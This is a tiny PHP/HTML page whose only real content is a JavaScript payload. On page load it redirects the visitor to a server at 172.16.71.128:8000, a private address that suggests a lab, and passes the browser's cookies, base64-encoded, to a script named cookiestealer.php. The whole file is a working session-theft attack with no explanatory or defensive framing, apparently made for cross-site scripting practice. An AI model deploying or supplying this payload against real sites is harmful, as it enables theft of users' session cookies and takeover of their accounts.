<?php
$server_ip = "172.16.71.128:8000";
?>

<html>
	<body>
		<!-- Hello world! -->
		<script type="text/javascript">
			document.location='http://<?php echo"$server_ip"; ?>/cookiestealer.php?c='+encodeURIComponent(btoa(document.cookie));
	</script>
	</body>
</html>
